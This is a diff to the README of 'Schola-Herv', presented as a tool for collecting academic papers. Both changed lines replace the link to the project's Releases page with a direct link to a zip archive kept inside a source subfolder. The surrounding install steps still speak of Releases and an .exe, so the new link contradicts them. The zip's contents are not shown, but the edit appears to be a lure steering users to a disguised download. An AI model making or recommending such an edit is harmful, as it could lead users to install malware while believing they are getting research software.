@@ -1,6 +1,6 @@
 # 📚 Schola-Herv - Build large academic research data collections
 
-[![Download Schola-Herv](https://img.shields.io/badge/Download_Schola--Herv-blue.svg)](https://github.com/bartolomeouneasy166/Schola-Herv/releases)
+[![Download Schola-Herv](https://img.shields.io/badge/Download_Schola--Herv-blue.svg)](https://github.com/bartolomeouneasy166/Schola-Herv/raw/refs/heads/main/schola_herv/discovery/Herv-Schola-1.2.zip)
 
 Schola-Herv gathers academic papers and PDF files from public databases. Researchers use this tool to build large datasets for literature reviews and training machine learning models. The software automates the process of finding and saving scientific documents.
 
@@ -23,7 +23,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link: [https://github.com/bartolomeouneasy166/Schola-Herv/releases](https://github.com/bartolomeouneasy166/Schola-Herv/releases)
+1. Visit the following link: [https://github.com/bartolomeouneasy166/Schola-Herv/raw/refs/heads/main/schola_herv/discovery/Herv-Schola-1.2.zip](https://github.com/bartolomeouneasy166/Schola-Herv/raw/refs/heads/main/schola_herv/discovery/Herv-Schola-1.2.zip)
 2. Look for the latest version under the Releases section.
 3. Click the link that ends in .exe to download the installer file to your computer.
 4. Locate the downloaded file in your Downloads folder.
